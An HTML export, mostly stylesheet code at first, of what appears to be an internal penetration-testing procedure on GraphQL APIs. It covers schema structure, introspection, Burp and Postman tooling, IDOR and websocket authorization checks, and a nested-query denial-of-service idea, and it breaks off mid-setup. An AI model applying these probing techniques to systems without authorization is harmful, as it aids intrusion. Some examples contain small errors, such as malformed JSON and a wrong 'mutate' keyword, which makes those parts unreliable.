+.gYUIkd table .grip-table::after{content:"";cursor:var(--pointer);background:#E8EBED;width:13px;height:13px;border-radius:13px;border:2px solid #FFFFFF;position:absolute;top:-18px;left:-18px;display:block;}/*!sc*/
+.gYUIkd table .grip-table:hover::after{background:#111319;}/*!sc*/
+.gYUIkd table .grip-table.selected::after{background:#0366d6;}/*!sc*/
+.gYUIkd .scrollable-wrapper{position:relative;margin:0.5em 0px;-webkit-scrollbar-width:thin;-moz-scrollbar-width:thin;-ms-scrollbar-width:thin;scrollbar-width:thin;-webkit-scrollbar-color:transparent transparent;-moz-scrollbar-color:transparent transparent;-ms-scrollbar-color:transparent transparent;scrollbar-color:transparent transparent;}/*!sc*/
+.gYUIkd .scrollable-wrapper:hover{-webkit-scrollbar-color:#bdc6cb #F4F7FA;-moz-scrollbar-color:#bdc6cb #F4F7FA;-ms-scrollbar-color:#bdc6cb #F4F7FA;scrollbar-color:#bdc6cb #F4F7FA;}/*!sc*/
+.gYUIkd .scrollable-wrapper ::-webkit-scrollbar{height:14px;background-color:transparent;}/*!sc*/
+.gYUIkd .scrollable-wrapper:hover ::-webkit-scrollbar{background-color:#F4F7FA;}/*!sc*/
+.gYUIkd .scrollable-wrapper ::-webkit-scrollbar-thumb{background-color:transparent;border:3px solid transparent;border-radius:7px;}/*!sc*/
+.gYUIkd .scrollable-wrapper:hover ::-webkit-scrollbar-thumb{background-color:#bdc6cb;border-color:#F4F7FA;}/*!sc*/
+.gYUIkd .scrollable{overflow-y:hidden;overflow-x:auto;padding-left:1em;margin-left:-1em;border-left:1px solid transparent;border-right:1px solid transparent;-webkit-transition:border 250ms ease-in-out 0s;transition:border 250ms ease-in-out 0s;}/*!sc*/
+.gYUIkd .scrollable-shadow{position:absolute;top:0;bottom:0;left:-1em;width:16px;-webkit-transition:box-shadow 250ms ease-in-out;transition:box-shadow 250ms ease-in-out;border:0px solid transparent;border-left-width:1em;pointer-events:none;}/*!sc*/
+.gYUIkd .scrollable-shadow.left{box-shadow:16px 0 16px -16px inset rgba(0,0,0,0.25);border-left:1em solid #FFFFFF;}/*!sc*/
+.gYUIkd .scrollable-shadow.right{right:0;left:auto;box-shadow:-16px 0 16px -16px inset rgba(0,0,0,0.25);}/*!sc*/
+.gYUIkd .block-menu-trigger{opacity:0;pointer-events:none;display:inline;width:24px;height:24px;color:#394351;background:none;position:absolute;-webkit-transition:color 150ms cubic-bezier(0.175,0.885,0.32,1.275), opacity 150ms ease-in-out;transition:color 150ms cubic-bezier(0.175,0.885,0.32,1.275), opacity 150ms ease-in-out;outline:none;border:0;padding:0;margin-top:1px;margin-left:-28px;border-radius:4px;}/*!sc*/
+.gYUIkd .block-menu-trigger:hover,.gYUIkd .block-menu-trigger:focus{cursor:var(--pointer);color:#111319;background:#EDF2F7;}/*!sc*/
+.gYUIkd .ProseMirror[contenteditable="true"]:focus-within,.gYUIkd .ProseMirror-focused .block-menu-trigger,.gYUIkd .block-menu-trigger:active,.gYUIkd .block-menu-trigger:focus{opacity:1;pointer-events:initial;}/*!sc*/
+.gYUIkd .ProseMirror-gapcursor{display:none;pointer-events:none;position:absolute;}/*!sc*/
+.gYUIkd .ProseMirror-gapcursor:after{content:"";display:block;position:absolute;top:-2px;width:20px;border-top:1px solid #111319;-webkit-animation:ProseMirror-cursor-blink 1.1s steps(2,start) infinite;animation:ProseMirror-cursor-blink 1.1s steps(2,start) infinite;}/*!sc*/
+.gYUIkd .folded-content{display:none;}/*!sc*/
+@-webkit-keyframes ProseMirror-cursor-blink{to{visibility:hidden;}}/*!sc*/
+@keyframes ProseMirror-cursor-blink{to{visibility:hidden;}}/*!sc*/
+.gYUIkd .ProseMirror-focused .ProseMirror-gapcursor{display:block;}/*!sc*/
+.gYUIkd del{color:#9BA6B2;-webkit-text-decoration:strikethrough;text-decoration:strikethrough;}/*!sc*/
+.gYUIkd ins[data-operation-index]{color:#111319;background-color:rgba(18,138,41,0.16);-webkit-text-decoration:none;text-decoration:none;}/*!sc*/
+.gYUIkd del[data-operation-index]{color:#394351;background-color:#ffebe9;-webkit-text-decoration:none;text-decoration:none;}/*!sc*/
+.gYUIkd del[data-operation-index] img{opacity:.5;}/*!sc*/
+@media print{.gYUIkd .placeholder:before,.gYUIkd .block-menu-trigger,.gYUIkd .heading-actions,.gYUIkd button.show-source-button,.gYUIkd h1:not(.placeholder):before,.gYUIkd h2:not(.placeholder):before,.gYUIkd h3:not(.placeholder):before,.gYUIkd h4:not(.placeholder):before,.gYUIkd h5:not(.placeholder):before,.gYUIkd h6:not(.placeholder):before{display:none;}.gYUIkd .image{page-break-inside:avoid;}.gYUIkd .comment-marker{border:0;background:none;}.gYUIkd .page-break{opacity:0;}.gYUIkd pre{overflow-x:hidden;white-space:pre-wrap;}.gYUIkd em,.gYUIkd blockquote{font-family:"SF Pro Text",-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,'Open Sans','Helvetica Neue',sans-serif;}}/*!sc*/
+.gYUIkd .math-node{min-width:1em;min-height:1em;font-size:0.95em;font-family:'SFMono-Regular',Consolas,'Liberation Mono',Menlo,Courier,monospace;cursor:auto;}/*!sc*/
+.gYUIkd .math-node.empty-math .math-render::before{content:"(empty math)";color:#FF5C80;}/*!sc*/
+.gYUIkd .math-node .math-render.parse-error::before{content:"(math error)";color:#FF5C80;cursor:help;}/*!sc*/
+.gYUIkd .math-node.ProseMirror-selectednode{outline:none;}/*!sc*/
+.gYUIkd .math-node .math-src{display:none;color:#22a2c9;tab-size:4;}/*!sc*/
+.gYUIkd .math-node.ProseMirror-selectednode .math-src{display:inline;}/*!sc*/
+.gYUIkd .math-node.ProseMirror-selectednode .math-render{display:none;}/*!sc*/
+.gYUIkd math-inline{display:inline;white-space:nowrap;}/*!sc*/
+.gYUIkd math-inline .math-render{display:inline-block;font-size:0.85em;}/*!sc*/
+.gYUIkd math-inline .math-src .ProseMirror{display:inline;margin:0px 3px;}/*!sc*/
+.gYUIkd math-block{display:block;}/*!sc*/
+.gYUIkd math-block .math-render{display:block;}/*!sc*/
+.gYUIkd math-block.ProseMirror-selectednode{border-radius:4px;border:1px solid #E8EBED;background:#F4F7FA;padding:0.75em 1em;font-family:'SFMono-Regular',Consolas,'Liberation Mono',Menlo,Courier,monospace;font-size:90%;}/*!sc*/
+.gYUIkd math-block .math-src .ProseMirror{width:100%;display:block;}/*!sc*/
+.gYUIkd math-block .katex-display{margin:0;}/*!sc*/
+.gYUIkd .katex-html *::selection{background-color:none !important;}/*!sc*/
+.gYUIkd .math-node.math-select .math-render{background-color:#c0c0c0ff;}/*!sc*/
+.gYUIkd math-inline.math-select .math-render{padding-top:2px;}/*!sc*/
+.gYUIkd .no-cursor{caret-color:transparent;}/*!sc*/
+.gYUIkd div:focus .fake-cursor,.gYUIkd span:focus .fake-cursor{margin-right:-1px;border-left-width:1px;border-left-style:solid;-webkit-animation:ProseMirror-cursor-blink 1.1s steps(2,start) infinite;animation:ProseMirror-cursor-blink 1.1s steps(2,start) infinite;position:relative;z-index:1;}/*!sc*/
+data-styled.g13[id="Styles__EditorContainer-sc-1ggx691-0"]{content:"gYUIkd,"}/*!sc*/
+html{line-height:1.15;-webkit-text-size-adjust:100%;}/*!sc*/
+body{margin:0;}/*!sc*/
+main{display:block;}/*!sc*/
+h1{font-size:2em;margin:0.67em 0;}/*!sc*/
+hr{box-sizing:content-box;height:0;overflow:visible;}/*!sc*/
+pre{font-family:monospace,monospace;font-size:1em;}/*!sc*/
+a{background-color:transparent;}/*!sc*/
+abbr[title]{border-bottom:none;-webkit-text-decoration:underline;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted;}/*!sc*/
+b,strong{font-weight:bolder;}/*!sc*/
+code,kbd,samp{font-family:monospace,monospace;font-size:1em;}/*!sc*/
+small{font-size:80%;}/*!sc*/
+sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline;}/*!sc*/
+sub{bottom:-0.25em;}/*!sc*/
+sup{top:-0.5em;}/*!sc*/
+img{border-style:none;}/*!sc*/
+button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0;}/*!sc*/
+button,input{overflow:visible;}/*!sc*/
+button,select{text-transform:none;}/*!sc*/
+button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button;}/*!sc*/
+button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0;}/*!sc*/
+button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText;}/*!sc*/
+fieldset{padding:0.35em 0.75em 0.625em;}/*!sc*/
+legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal;}/*!sc*/
+progress{vertical-align:baseline;}/*!sc*/
+textarea{overflow:auto;}/*!sc*/
+[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0;}/*!sc*/
+[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto;}/*!sc*/
+[type="search"]{-webkit-appearance:textfield;outline-offset:-2px;}/*!sc*/
+[type="search"]::-webkit-search-decoration{-webkit-appearance:none;}/*!sc*/
+::-webkit-file-upload-button{-webkit-appearance:button;font:inherit;}/*!sc*/
+details{display:block;}/*!sc*/
+summary{display:list-item;}/*!sc*/
+template{display:none;}/*!sc*/
+[hidden]{display:none;}/*!sc*/
+*{box-sizing:border-box;}/*!sc*/
+html,body{width:100%;height:100%;margin:0;padding:0;print-color-adjust:exact;-webkit-print-color-adjust:exact;--pointer:default;}/*!sc*/
+body,button,input,optgroup,select,textarea{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,'Open Sans','Helvetica Neue',sans-serif;}/*!sc*/
+body{font-size:16px;line-height:1.5;color:#111319;overscroll-behavior-y:none;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;}/*!sc*/
+@media (min-width:737px){html,body{min-height:100vh;}}/*!sc*/
+@media (min-width:737px) and (display-mode:standalone){body:after{content:"";display:block;position:fixed;top:0;left:0;right:0;height:1px;background:#DAE1E9;z-index:10000;}}/*!sc*/
+a{color:#0366d6;-webkit-text-decoration:none;text-decoration:none;cursor:pointer;}/*!sc*/
+h1,h2,h3,h4,h5,h6{font-weight:500;line-height:1.25;margin-top:1em;margin-bottom:0.5em;}/*!sc*/
+h1{font-size:2.25em;}/*!sc*/
+h2{font-size:1.5em;}/*!sc*/
+h3{font-size:1.25em;}/*!sc*/
+h4{font-size:1em;}/*!sc*/
+h5{font-size:0.875em;}/*!sc*/
+h6{font-size:0.75em;}/*!sc*/
+p,dl,ol,ul,pre,blockquote{margin-top:1em;margin-bottom:1em;}/*!sc*/
+hr{border:0;height:0;border-top:1px solid #DAE1E9;}/*!sc*/
+.js-focus-visible :focus:not(.focus-visible){outline:none;}/*!sc*/
+.js-focus-visible .focus-visible{outline-color:#0366d6;outline-offset:-1px;}/*!sc*/
+data-styled.g23[id="sc-global-bgMkpR1"]{content:"sc-global-bgMkpR1,"}/*!sc*/
+.iylGhi{max-width:46em;margin:0 auto;padding:0 1em;}/*!sc*/
+data-styled.g28[id="sc-eCApnc"]{content:"iylGhi,"}/*!sc*/
+</style></head><body><article class="sc-eCApnc iylGhi"><h1 dir="ltr">GraphQL Testing &amp; Procedure</h1><div dir="ltr" class="Styles__EditorContainer-sc-1ggx691-0 gYUIkd"><div id="content" class="ProseMirror"><p>Portswigger Content: <a href="https://portswigger.net/web-security/graphql/what-is-graphql" rel="noopener noreferrer nofollow">https://portswigger.net/web-security/graphql/what-is-graphql</a></p><h1><span contenteditable="false" class="heading-actions "></span><span class="heading-content">GraphQL Summary</span></h1><p>Reference: <a href="https://graphql.org/learn/schema/" rel="noopener noreferrer nofollow">https://graphql.org/learn/schema/</a></p><p>GraphQL is just another way to call APIs like how you typically see REST-based APIs. In REST-based APIs you usually have a different URL tied to a different action. For example, to get a group in a company you sssmight call <code class="inline" spellcheck="false">/settings/groupinfo</code>, while to get a user you might call <code class="inline" spellcheck="false">/settings/userinfo</code> . However, in GraphQL there is just <strong>one</strong> endpoint (usually something like <code class="inline" spellcheck="false">/graphql</code> ) under which you call all APIs. Since there is only one endpoint, you need a way to differentiate between the different APIs when sending the HTTP request. In GraphQL you typically pass in specific GET/POST parameters that indicates what API you are calling (query parameter) and supplies the necessary data to make the API call (variables parameter).</p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">200 OK
+Content-Type: application/json
+
+{
+  "groupName":"Scott's Group",
+  "numberOfMembers":55,
+  "groupLeader": {
+    "userName":"Scott",
+    "userHeight":55
+  }
+}</code></pre></div><p>Observe the conceptual difference between the APIs below. Note that REST API will return <strong>all data</strong> for the groups. The caller cannot specify which fields to return. In GraphQL, however, I can specify to <strong>only return</strong> groupName and numberOfMembers. This is usually a big selling point you will hear about; the ability to return ONLY what is needed in each API call per GraphQL. As we will see shortly, you can also pass in “variables” in GraphQL requests which is how you can pass in IDs for IDOR type API calls.</p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">200 OK
+Content-Type: application/json
+
+{
+"groupName":"testGroup",
+"numberOfMembers": 4,
+ "UserObject": {
+    "userName": "Scott",
+    "userHeight": 55
+  }
+}</code></pre></div><p><strong>REST API to Get Groups:</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">GET /settings/groupinfo/1234 HTTP/1.1
+Host: netspi.com</code></pre></div><p><strong>GraphQL API to Get Groups</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">POST /graphql HTTP/1.1
+Host: netspi.com
+Content-Length: #
+
+{
+  "operationName": "getGroup",
+  "variables": {
+    "groupValue": 1234
+  }
+  "query": "query GetGroup($groupValue: ID!){\n group(groupId:$groupValue) {\n groupName \n numberOfMembers}
+}</code></pre></div><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">API Details</span></h2><p>In GraphQL, the 3 basic API types are queries, mutations, and subscriptions.</p><p><strong>Queries</strong> use the “query” keyword and can be thought of as synonymous with REST-based GET requests; they access data.</p><p><strong>Mutations</strong> use the “mutate” keyword and can be thought of as POST/PUT REST-based requests; they edit or change data.</p><p><strong>Subscriptions</strong> don’t really have an associated REST equivalent. They are API calls you make to “subscribe” to a topic. When the topic activates at some later point in time you will be pushed data. I have seen these a lot over websockets. You subscribe to the topic over websockets, and later the websocket will push data to you if an action occurs.</p><p>Besides the query/mutation/subscription keywords, each API is called in a similar format. The examples below show query examples. The base query below is “groups” and the overall query specifies that the groupName and numberOfMembers attributes are to be returned in the HTTP Response. We can then wrap this base query in an “operation name” (Format 2) which is typically what you will see on engagements. Per the documentation, operation names can be optional: “It [operation name] is only required in multi-operation documents, but its use is encouraged because it is very helpful for debugging and server-side logging”</p><p><strong>Format 1 (Base Query):</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">{
+  group {
+    groupName
+    numberOfMembers
+  }
+}</code></pre></div><p><strong>Format 2 (Operation Name):</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">query  getGroup {
+  group  {
+    groupName
+    numberOfMembers
+  }
+}</code></pre></div><p>We can also pass in variables to the queries to specify what group ID we are trying to fetch. This value can be passed in directly to the base query (Format 1), passed in via an operation name through a separate “variables” parameter (Format 2), or passed in directly in the base query with an operation name (Format 3).</p><p><strong>Format 1:</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">{
+  group (groupId: 123) {
+    groupName
+    numberOfMembers
+  }
+}</code></pre></div><p><strong>Format 2 Query #1:</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">query getGroup($groupId: ID!){
+  group(groupId:$groupId){
+    groupName
+    numberOfMembers
+  }
+}</code></pre></div><p><strong>Format 2 Variables #2:</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">{
+  "groupId": 123
+}</code></pre></div><p><strong>Format 3:</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">query getGroup{
+  group(groupId:1234){
+    groupName
+    numberOfMembers
+  }
+}</code></pre></div><p>With this in mind, reconsider the original GraphQL POST request:</p><p><strong>GraphQL API to Get Group</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">POST /graphql HTTP/1.1
+Host: netspi.com
+Content-Length: #
+
+{
+  "operationName": "getGroup",
+  "variables": {
+    "groupValue": 1234
+  }
+  "query": "query getGroup($groupValue: ID!){\n group(groupId:$groupValue) {\n groupName \n numberOfMembers}
+}</code></pre></div><ul><li><p>The API itself is a query operation</p></li><li><p>The operation name is getGroup. While this operation name is optional, a mismatch between the <strong>operationName</strong> <strong>parameter</strong> and the <strong>operation name</strong> <strong>specified in the query parameter</strong> will sometimes cause errors. Usually you can just delete the <strong>operationName</strong> <strong>parameter</strong> entirely to fix this.</p></li><li><p>There is one key-value pair in variables that will be used in the actual query. If we had this request in burp this might be something valuable to fuzz or test.</p><ul><li><p>Note the variable names is subjective. In this case it is “$groupId” but we can change the key value in the variables parameter and the “$” keywords to any other keyword as long as they all match. For example, instead of $groupId I could do $abc and change the variable parameter’s key from groupId to abc.</p></li></ul></li><li><p>The query itself uses the $groupId variable which is of type “ID”, and passes it into the groupId parameter in the base query itself.</p></li><li><p>The query only returns the groupName (string) and numberOfMembers (int) attributes from the “Group” object returned.</p></li></ul><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">Schema Details</span></h2><p>In the example above, we stated the “Group” object was returned. In GraphQL, the “schema” defines all API required arguments, graph objects, object attributes, etc. It can be thought of as equivalent to the swagger.json file.  With regards to the API example above, we can think of the Group object defined as follows in the actual schema:</p><p><strong>Group Definition Schema</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">type Query {
+  getGroup(groupId: ID!): Group
+}
+
+type Group{
+  groupName: String!
+  numberOfMembers: Float!
+  groupAge: Float!
+  isVerified: Boolean!
+  createdDate: Timestamp!
+  groupLeader: User!
+}
+
+type User{
+  userName: String
+  userHeight: Float!
+  userPassword: String!
+  groupOfMember: Group!
+}</code></pre></div><p>Note that the “!” does NOT mean mandatory in the schema, it just means “non-null”. So in the example above, it is fine if you request <code class="inline" spellcheck="false">userName</code> for type <code class="inline" spellcheck="false">User</code> and it returns <code class="inline" spellcheck="false">null</code> . However, if you do the same for <code class="inline" spellcheck="false">userHeight</code> which is null than you will get an error because <code class="inline" spellcheck="false">!</code> means null can’t be returned.</p><p>Looking at the schema above,  we can see that we only returned groupName and numberOfMembers but there were other attributes we could have specified like “isVerified”. Notice that “groupLeader” is not of a primitive data type, but is another object. This is where the “graph” aspect of GraphQL comes into play as you can traverse relationships between objects. For example, if we <strong>also</strong> wanted to return groupLeader we could make a query of the following format.</p><p><strong>Format 2 (Query With Operation Name with Nested Attributes) #1:</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">query getGroup($groupValue: ID!){
+  group(groupId:$groupValue){
+    groupName
+    numberOfMembers
+    groupLeader {
+      userName
+      userHeight
+    }
+  }
+}</code></pre></div><p><strong>Format 2 (Variables):</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">"variables": {"groupValue": 1234}</code></pre></div><p>Because the User object has a Group object, we can also traverse back to the group object again and keep continuing the cycle! Remember that the group query takes a variable so we need to pass that in. Note this will be discussed later as being a potential exploit vector. If you can keep traversing the same cycle, and the client puts no limits on query depth, than there is a potential DOS vector.</p><p><strong>Format 2 (Query With Operation Name with Nested Attributes) #1:</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">query getGroup($groupValue: ID!){
+  group(groupId:$groupValue){
+    groupName
+    numberOfMembers
+    groupLeader {
+      userName
+      userHeight
+      groupOfMember(groupValue: 1234){
+        groupName
+        isVerified
+        groupLeader {
+          etc...
+        }
+     }
+    }
+  }
+}</code></pre></div><p><strong>Format 2 (Variables):</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">"variables": {"groupValue": 1234}</code></pre></div><p><strong>Conceptual Diagram</strong></p><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/e42a01a1-f82a-43e5-a545-f4445c8d8a29/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=6f0961b61778e8eaa73e72e0a7f3e0b65fe0140324afffba6dd331b2cc793b63&X-Amz-SignedHeaders=host&response-content-disposition=attachment" width="323" height="312" title="" contenteditable="false"><p class="caption"></p></div></p><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">Misc. Schema Items: Fragments/Unions</span></h2><p>Another GraphQL component is <code class="inline" spellcheck="false">fragments</code>. If you are passing in a massive query made of many parts, you can break each part out into its own wrapper/variable per se called a fragment. For example, we can rewrite the query above using fragments by swapping out some logic for a fragment with a <code class="inline" spellcheck="false">…[FRAGMENT_NAME]</code> as the placeholder, and subsequently defining the fragment.</p><p><strong>Format 2 (Query With Operation Name &amp; Fragments) #1:</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">query getGroup($groupId: ID!){
+  group(groupId:$groupId){
+    groupName
+    numberOfMembers
+    ...leaderSummary
+  }
+}
+
+fragment leaderSummary on Group {
+  userName
+  userHeight
+   groupOfMember(groupId: 1234){
+        groupName
+        isVerified
+    }
+}</code></pre></div><p><code class="inline" spellcheck="false">Union</code> data types are another type defined in the GraphQL schema, and have a special query notation when calling their associated attributes involving the <code class="inline" spellcheck="false">…on</code> phrase. Looking back at the schema, you can define a return type as a conditional. Review the example below from <a href="https://www.apollographql.com/docs/apollo-server/schema/unions-interfaces/" rel="noopener noreferrer nofollow">here</a></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">union SearchResult = Book | Author
+
+type Book {
+  title: String!
+}
+
+type Author {
+  name: String!
+}
+
+type Query {
+  search(contains: String): [SearchResult!]
+}</code></pre></div><p>We then leverage the <code class="inline" spellcheck="false">…on</code> keyword to return the associated attribute depending on what object is actually returned. In this way we can specify both objects as return types in one query without getting an error:</p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">query GetSearchResults {
+  search(contains: "Shakespeare") {
+    # Querying for __typename is almost always recommended,
+    # but it's even more important when querying a field that
+    # might return one of multiple types.
+    __typename
+    ... on Book {
+      title
+    }
+    ... on Author {
+      name
+    }
+  }
+}</code></pre></div><h1><span contenteditable="false" class="heading-actions "></span><span class="heading-content">How to test?</span></h1><ol><li><p>Get the introspection schema by:</p><ol><li><p>Asking the application team for the introspection query during the kickoff. Usually there is some “export” feature in whatever tool they used to build the GraphQL queries that requires minimal work to get it to you.</p></li><li><p>Making an introspection query as detailed below if you don’t  have a schema by the test start date</p></li><li><p>If you don’t have the schema and the introspection query is blocked, request the introspection schema from the application team.</p></li></ol></li><li><p>Once you have the introspection query, you can plug it into a number of tools listed below:</p><ul><li><p><strong>InQL:</strong> Available in the BApp Store. You can give this plugin the introspection query results and it should auto-generate requests for you to send to Repeater. This is fairly finicky and buggy though as a Burp extension. Check the error output pane in the extensions tab in Burp if the plugin is not working. GraphQuail should work for you if InQL fails.</p></li><li><p><strong>Postman:</strong> A good substitute for InQL, teams might give you a schema that was naturally exported from Postman meaning you can then import it into Postman on your side again.</p></li><li><p><strong>GraphQuail</strong>: Not in the BApp Store. Requires a manual Gradle build. Creates both GraphQL Playground and GraphQL Voyager for you when given the schema. This should give you a tab to both call APIs and see the entire schema relationships helping visualize the graph like the image above showing the relationship between User and Group.</p></li></ul></li><li><p>Some tools don’t necessarily need the introspection query but can help with editing/working with GraphQL:</p><ol><li><p><strong>GraphQL Raider</strong>: Can be used to remove all the newline and escape characters when editing the “query” parameter in the HTTP request. Sometimes does not recognize GraphQL queries if they are in a batch using [].</p></li></ol></li><li><p>Test the individual issues listed below. Look for API queries/mutations that might not be called normally via the UI but that can be manually built using GraphQL Voyager or another tool.</p></li><li><p>Make sure to check the Websockets tab in Burp Suite. GraphQL subscriptions and sometimes queries/mutations can be sent over Websockets.  This should be tested for auth controls. For example, can you subscribe to a topic as a low level user, have a high level user do an action to trigger the topic, and have the low lever user get verbose info back?</p></li></ol><h1><span contenteditable="false" class="heading-actions "></span><span class="heading-content">Postman Setup:</span></h1><ol><li><p>Open Postman and navigate to File→Import.</p></li></ol><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/8ae74684-7b07-47de-b534-5feb8353dacc/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=044caff3b16dd0aafd96106e34e56695400fe1bc73f1b2128a0423b3856156df&X-Amz-SignedHeaders=host&response-content-disposition=attachment" width="778" height="411" title="" contenteditable="false"><p class="caption"></p></div></p><ol><li><p>Upload the GraphQL Schema File and choose to import the schema.</p></li></ol><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/3338f3af-7880-4c21-919b-8378579764ac/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=fb4a05bc44c81fb7216a8f5dfadb7765322dd1386c4ee0c44aa42b99af92dc4a&X-Amz-SignedHeaders=host&response-content-disposition=attachment" contenteditable="false"><p class="caption"></p></div></p><ol><li><p>Observe all the APIs should now be callable from Collections</p></li></ol><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/67d8b2ee-f3c5-443c-aac4-1ff78d6444c2/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=7a82ab745942b8970eee1a2d297ef8d0e263a20a62593ceb244d266da50816de&X-Amz-SignedHeaders=host&response-content-disposition=attachment" contenteditable="false"><p class="caption"></p></div></p><h1><span contenteditable="false" class="heading-actions "></span><span class="heading-content">GraphQuail Setup:</span></h1><ol><li><p>Download GraphQuail JAR from the NetSPI Github Repo at <a href="https://github.com/NetSPI/GraphQLResources/blob/main/GraphQuail-0.1.jar" rel="noopener noreferrer nofollow">https://github.com/NetSPI/GraphQLResources/blob/main/GraphQuail-0.1.jar</a>.</p><ol><li><p>Note this JAR was built from the following repo: <a href="https://github.com/forcesunseen/graphquail" rel="noopener noreferrer nofollow">https://github.com/forcesunseen/graphquail</a></p></li></ol></li><li><p>Navigate to “Extensions→Installed in Burp Suite. Choose Add and enter the path to the JAR. You should see a new extension added with no errors in the error pane.</p></li></ol><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/b9b4a8e4-28fc-4ead-9d07-82a6e4601140/GraphQL_1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=6c958074964453dbd27502d2fbffb01ee179606c7ef7b03f8dadcd65dbd3fb74&X-Amz-SignedHeaders=host&response-content-disposition=attachment" width="530" height="256" alt="Extensions-->Installed" title="" contenteditable="false"><p class="caption"></p></div></p><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/d8d5d178-1382-41d9-8797-0cb8ee05c811/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=235465f8da55e754e661f1c950ea03bd35ed869cc9d8afb6597e6ae9b008bba2&X-Amz-SignedHeaders=host&response-content-disposition=attachment" width="530" height="378" alt="Adding the Extension" title="" contenteditable="false"><p class="caption"></p></div></p><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/2cfd7559-7833-475b-8eb4-da493de6e8f8/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=14e39a382e894b0fad3b9aa33d9871fa339c73f987bd3ae60436c59e6ed6602f&X-Amz-SignedHeaders=host&response-content-disposition=attachment" alt="Extension Added" contenteditable="false"><p class="caption"></p></div></p><ol><li><p>At this point in time, you should have the GraphQL schema. This can be found via the introspection query, or provided to the tester via the application team.</p></li><li><p>Enable all the options under Emulator Settings, and generate a unique ID for GraphiQL and Voyager as seen below. Also check “Introspection Emulation” which will be used shortly as input for the GraphQL Schema.</p></li></ol><p><div class="image"><img 